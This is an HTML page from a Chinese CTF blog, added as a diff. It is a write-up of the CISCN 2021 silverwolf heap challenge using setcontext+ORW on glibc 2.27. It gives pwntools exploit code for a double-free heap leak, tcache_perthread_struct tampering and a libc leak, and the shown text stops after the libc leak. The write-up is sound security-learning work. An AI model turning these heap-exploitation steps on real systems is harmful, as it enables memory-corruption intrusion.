@@ -1,0 +1,597 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    SetContentORWlibc-2.27 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="SetContent ORW libc-2.27参考资料：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;pwnfeifei&#x2F;p&#x2F;15819825.html setcontext+orw 大致可以把2.27，2.29做为两个分界点。我们先来讨论 2.27 及以下的 setcontext + orw 的写法。 在学习过 SROP 之后我们知道 pwntools 自带了一款可以控制寄存器值的工具 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SetContentORWlibc-2.27">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/SetContentORWlibc-2.27/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="SetContent ORW libc-2.27参考资料：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;pwnfeifei&#x2F;p&#x2F;15819825.html setcontext+orw 大致可以把2.27，2.29做为两个分界点。我们先来讨论 2.27 及以下的 setcontext + orw 的写法。 在学习过 SROP 之后我们知道 pwntools 自带了一款可以控制寄存器值的工具 12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775706611329-9350e679-66cd-42db-ab55-806788b602c7-613698.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775653886874-c85a3a8f-aa40-4710-9c6a-02647ced8c55-266825.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775654727070-99183f93-68ee-4250-9ea9-7b4482c0177f-001330.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775726489021-2b7dc61e-1686-4558-ac82-ef7a96c37404-619703.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775726914201-800fb1cc-9ccb-45fc-8aeb-afe1e002a9bd-653887.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775727018540-fea914d7-dbe9-4518-b73d-a8868ed40a47-658644.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775728769754-54503425-a032-4377-a8af-e21f6d670efe-959477.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775729011110-485e10df-3bcc-4f98-85ca-ccba7651c8dc-268603.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775729808027-810d7383-7474-4df3-9c41-ce35fcec138a-725249.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775706611329-9350e679-66cd-42db-ab55-806788b602c7-918876.webp">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775732899284-8a337bef-39af-4803-80b4-ac04243d87b3-603419.png">
+<meta property="article:published_time" content="2026-04-28T10:25:56.929Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.380Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/f6ksCbZdb7oGcZDf/1775706611329-9350e679-66cd-42db-ab55-806788b602c7-613698.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="SetContentORWlibc-2.27">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">SetContentORWlibc-2.27</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SetContent-ORW-libc-2-27"><span class="toc-number">1.</span> <span class="toc-text">SetContent ORW libc-2.27</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN-2021-%E5%88%9D%E8%B5%9B-silverwolf-libc-2-27-SetContent-ORW"><span class="toc-number">1.1.</span> <span class="toc-text">[CISCN 2021 初赛]silverwolf(libc-2.27 SetContent+ORW)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B4%E7%90%86%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">整理一下思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%81%E8%A3%85%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">封装函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-heap-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.2.</span> <span class="toc-text">泄露 heap 基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.3.</span> <span class="toc-text">泄露 libc 基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87-ROP-gadgets-%E5%9C%B0%E5%9D%80%E5%92%8C%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">1.3.4.</span> <span class="toc-text">准备 ROP  gadgets 地址和函数地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AF%A1%E6%94%B9-Tcache-Entries-%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B0%E5%A4%9A%E6%AC%A1%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%88%86%E9%85%8D"><span class="toc-number">1.3.5.</span> <span class="toc-text">篡改 Tcache Entries 数组实现多次任意地址分配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2-ORW-%E9%93%BE%E4%B8%8E%E8%A7%A6%E5%8F%91-setcontext"><span class="toc-number">1.3.6.</span> <span class="toc-text">部署 ORW 链与触发 setcontext</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">总 EXP：</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/SetContentORWlibc-2.27" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:56.929Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="SetContent-ORW-libc-2-27"><a href="#SetContent-ORW-libc-2-27" class="headerlink" title="SetContent ORW libc-2.27"></a>SetContent ORW libc-2.27</h1><p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">参考资料：</font><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15819825.html">https://www.cnblogs.com/pwnfeifei/p/15819825.html</a></p>
+<p><font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">setcontext+orw 大致可以把2.27，2.29做为两个分界点。我们先来讨论 2.27 及以下的 setcontext + orw 的写法。</font></p>
+<p>在学习过 SROP 之后我们知道 pwntools 自带了一款可以控制寄存器值的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = xxx</span><br><span class="line">frame.rdi = xxx</span><br><span class="line">frame.rsi = xxx</span><br><span class="line">frame.rdx = xxx</span><br><span class="line">frame.rip = xxx</span><br></pre></td></tr></table></figure>
+
+<p>frame 的本质就是依靠 SetContext 来实现的，我们可以从 IDA 中查看他的具体信息</p>
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775706611329-9350e679-66cd-42db-ab55-806788b602c7-613698.png" alt="1775706611329-9350e679-66cd-42db-ab55-806788b602c7.png"></p>
+<p>我们可以清楚地看到 SetContent 是通过 rdi 寄存器附近的地址来设置各个寄存器的值。在 glibc-2.27 当中，我们通常从 SetContent + 53 开始使用，也就是图中 0x52180 + 53 &#x3D; 0x521B5 的位置。</p>
+<h3 id="CISCN-2021-初赛-silverwolf-libc-2-27-SetContent-ORW"><a href="#CISCN-2021-初赛-silverwolf-libc-2-27-SetContent-ORW" class="headerlink" title="[CISCN 2021 初赛]silverwolf(libc-2.27 SetContent+ORW)"></a>[CISCN 2021 初赛]silverwolf(libc-2.27 SetContent+ORW)</h3><p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775653886874-c85a3a8f-aa40-4710-9c6a-02647ced8c55-266825.png" alt="1775653886874-c85a3a8f-aa40-4710-9c6a-02647ced8c55.png"></p>
+<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>这道题可以和 lonelywolf 放在一起去分析，两者程序不同的地方在于 silverwolf 在初始化的时候开启了沙箱</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_C70()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rbx</span><br><span class="line"></span><br><span class="line">  setvbuf(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v0 = seccomp_init(<span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775654727070-99183f93-68ee-4250-9ea9-7b4482c0177f-001330.png" alt="1775654727070-99183f93-68ee-4250-9ea9-7b4482c0177f.png"></p>
+<h4 id="整理一下思路："><a href="#整理一下思路：" class="headerlink" title="整理一下思路："></a>整理一下思路：</h4><p>这道题比上一题多了沙箱机制的保护，也就是说我们需要去打一个 ORW。既然是堆上的 ORW 就需要去泄露 libc_base 和 heap_base。泄露 heap_base 是为了将栈迁移到堆上，并在堆上构造 ROP 链；libc_base 是为了寻找相应的 ROPgadgets。</p>
+<h3 id="EXP-思路："><a href="#EXP-思路：" class="headerlink" title="EXP 思路："></a>EXP 思路：</h3><h4 id="封装函数："><a href="#封装函数：" class="headerlink" title="封装函数："></a>封装函数：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775726489021-2b7dc61e-1686-4558-ac82-ef7a96c37404-619703.png" alt="1775726489021-2b7dc61e-1686-4558-ac82-ef7a96c37404.png"></p>
+<p>在我们封装完函数看一下堆情况，发现部分 Tcachebins 已经被填满了</p>
+<h4 id="泄露-heap-基地址"><a href="#泄露-heap-基地址" class="headerlink" title="泄露 heap 基地址"></a>泄露 heap 基地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x78</span>)</span><br><span class="line">    edit(<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775726914201-800fb1cc-9ccb-45fc-8aeb-afe1e002a9bd-653887.png" alt="1775726914201-800fb1cc-9ccb-45fc-8aeb-afe1e002a9bd.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free()</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775727018540-fea914d7-dbe9-4518-b73d-a8868ed40a47-658644.png" alt="1775727018540-fea914d7-dbe9-4518-b73d-a8868ed40a47.png"></p>
+<p>对 index0 的堆进行 Double Free，同时清空其 fd 和 bk 指针(可以不要)，让他指向自己，防止影响程序运行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">success(<span class="string">&#x27;heap_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_base)))</span><br></pre></td></tr></table></figure>
+
+<p>通过 double free 泄露当前堆地址。</p>
+<p>在 Linux 中，系统分配内存是以 页 (Page) 为单位的，一个标准页的大小通常是 4KB，即十六进制的 0x1000</p>
+<p>堆内存（Heap）在初始化时，操作系统会分配一大块连续的内存空间。这块空间的起始地址一定是按页对齐的。也就是说，堆的真正开头（Heap Base）地址的最后三位十六进制数一定是 000。</p>
+<ul>
+<li>泄露的地址：0x0000555f50014fa0 （这是堆中的某个具体位置）</li>
+<li>堆的基地址：0x0000555f50014000 （这是整个堆的起点）</li>
+</ul>
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775728769754-54503425-a032-4377-a8af-e21f6d670efe-959477.png" alt="1775728769754-54503425-a032-4377-a8af-e21f6d670efe.png"></p>
+<h4 id="泄露-libc-基地址"><a href="#泄露-libc-基地址" class="headerlink" title="泄露 libc 基地址"></a>泄露 libc 基地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(heap_base + <span class="number">0x10</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>edit(p64(heap_base+0x10)): 修改 index 0（当前位于 tcache 头部）的 fd 指针为 heap_base+0x10。这个地址是 tcache_perthread_struct 结构体在堆上的位置，它掌管着整个 tcache</li>
+</ul>
+<p><img src="/HFTTC.github.io/./img/f6ksCbZdb7oGcZDf/1775729011110-485e10df-3bcc-4f98-85ca-ccba7651c8dc-268603.png" alt="1775729011110-485e10df-3bcc-4f98-85ca-ccba7651c8dc.png"></p>
+<ul>
+<li>add(0x78); add(0x78): 第一次分配拿到原来的 chunk，第二次分配就将 tcache_perthread_struct 当作正常的 chunk 分配出来了，<font style="color:#DF2A3F;">此时 index 0 指向了 tcache 控制块。</font></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x23</span> + <span class="string">&#x27;\x07&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>edit(‘\x00’*0x23 + ‘\x07’): 篡改 tcache 控制块。将偏移 0x23 的位置改为 \x07。在 tcache_perthread_struct 中，这部分记录了各个大小的 tcache bin 的 chunk 数量。改为 7 意味着欺骗 glibc，让它以为特定大小的 tcache 已经满了。事实上，这个数改大一点也没有关系，比如 \x0ff。</li>
+<li><font style="color:#8A8F8D;">&lt;–改成 0xff 其实我自己也不确定可不可以，lonelywolf 是可以的，本质就是欺骗 Tcachebin 数量–&gt;</font></li>
+<li>free(); show(): 再次释放当前 chunk，因为 tcache 被伪造为已满，所以它会被放入 Unsorted Bin 中。放入 Unsorted Bin 的 chunk，其 fd 会被修改为 main_arena + 96，之后通过 show() 泄露该地址。</li>
+</ul>
